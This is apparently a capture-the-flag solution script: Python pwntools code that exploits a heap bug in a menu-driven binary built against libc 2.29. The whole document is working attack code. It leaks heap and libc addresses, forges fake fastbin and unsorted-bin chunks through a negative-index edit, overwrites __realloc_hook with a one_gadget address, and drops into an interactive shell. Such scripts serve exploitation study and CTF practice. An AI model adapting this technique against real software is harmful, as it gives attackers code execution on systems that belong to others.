#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
r = process('./D', env={"LD_PRELOAD": "./libc-2.29.so"})
l = ELF('./libc-2.29.so')
#r = remote('127.0.0.1', 9999)

def show_name():
    r.sendafter('choice : ', '1')

def write_d(size, data): 
    r.sendafter('choice : ', '2')
    r.sendafter('Length : ', str(size))
    r.sendafter('Content : ', data)

def read_d(idx):
    r.sendafter('choice : ', '3')
    r.sendafter('Page : ', str(idx))
    
def edit_d(idx, data): 
    r.sendafter('choice : ', '4')
    r.sendafter('Page : ', str(idx))
    r.sendafter('Content : ', data)

def tear_d(idx):
    r.sendafter('choice : ', '5')
    r.sendafter('Page : ', str(idx))

##### leak heap #####
r.sendafter("What's your name : ", 'Q'*0x20)
write_d(0x80, b'Q'*4 + b'Q'*0x48 + p64(0) + p64(0x41) + p64(0) + p64(0x31) + p64(0) + p64(0x21)) # 0
show_name()
r.recvuntil('Q'*0x20)
heap = u64(r.recv(6) + b'\x00\x00') - 0x260
success(f"heap: {hex(heap)}")
one = 0x106ef8

for i in range(1, 9):
    # 1~8
    if i == 1:
       write_d(0x80, p32(0) + p64(0) + p64(0x20) + p64(0x20))
    elif i == 2:
        fake = b''
        for i in range(5):
            fake += p64(heap + 0x390 + i*0x10) + p64(0)
        fake += p64(heap + 0x2b8) + p64(0)
        write_d(0x80, p32(0) + p64(0) + fake)
    else:
        write_d(0x80, p32(0) + p64(0) + p64(0x20) + p64(0x20))

for i in range(8, 0, -1):
    tear_d(i)

fastbinY = flat(
     0,
     heap + 0x2c0, # 0x30
     heap + 0x2b0, # 0x40
     0, 0,
     heap + 0x2d0, # 0x70
     0, 0, 0, 0,
)

top_chunk = p64(heap)
edit_d(-6, (b'\x00'*0xe0).ljust(0x214, b'\x00') + p64(0x71) + p64(0) + p64(0)*1 + b'\x00'*0x20 + fastbinY + top_chunk)
write_d(0x24, b'Q'*0x24) # 9
read_d(9)
r.recvuntil('Q'*0x24)
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x1e4ca0
l.address = libc
success(f"libc: {hex(libc)}")
# fake unsorted bin chunk
write_d(0x34, p32(0) + p64(l.sym['__realloc_hook'] - 0x18)*2 + p64(0x71) + p64(heap+0x380) + p64(0x21) + p64(libc + 0x1e4ca0)) # 10

write_d(0x64, 'A') # 11
#write_d(0x64, p32(0) + p64(one + libc) + p64(l.sym['realloc']))
write_d(0x64, p32(0) + p64(one + libc) + p64(one + libc)) # 12

r.sendafter('choice : ', '2')
input()
r.sendafter('Length : ', str(0x44))
r.interactive()
